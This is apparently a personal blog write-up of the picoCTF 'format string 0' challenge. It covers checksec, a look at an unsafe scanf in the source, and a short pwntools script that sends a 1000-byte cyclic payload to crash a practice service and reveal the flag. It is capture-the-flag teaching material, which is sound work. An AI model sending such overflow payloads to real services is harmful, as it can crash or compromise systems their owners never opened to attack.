---
title: picoCTF - format string 0
date: 2026-06-27 00:00:00 +0800
categories: [PWN]
tags:      # TAG names should always be lowercase
description: format string 0 walkthrough
toc: true
---


## Introduction
Today i will be explaining how i solved format string 0 from picoCTF <https://learn.cylabacademy.org/library/433?page=1&category=6>


## checksec
When running `checksec` it provided the following output as shown below.

![](assets/posts/PWN/picoCTF/format-string-0/checksec.png)

## Source code inspection
Upon inspecting the source code, i realised that as long as the program runs into a segmentation fault, this will provide me with the flag as shown below. 

![](assets/posts/PWN/picoCTF/format-string-0/sc1.png)

Secondly, the function __scanf__ is used unsafely as shown below. This means a buffer overflow is possible. 

![](assets/posts/PWN/picoCTF/format-string-0/sc2.png)

This gives me the idea of buffer overflowing to the point the program reaches a segmentation fault, thus easily giving me the flag. 

## Completing the challenge

To test out my theory i used the following script as shown below.
```
from pwn import *

# Connection details
HOST = ''
PORT = 
context.log_level = 'debug'
io = remote(HOST, PORT)

# PAYLOADS HERE

io.recvuntil(b'Enter your recommendation: ')
payload = cyclic(1000)
print(f"Send payload: {payload}")
io.sendline(payload)


# LAST LINE MUST HAVE THIS
io.interactive()
```
This gave me the following output as shown below.

![](assets/posts/PWN/picoCTF/format-string-0/flag.png)





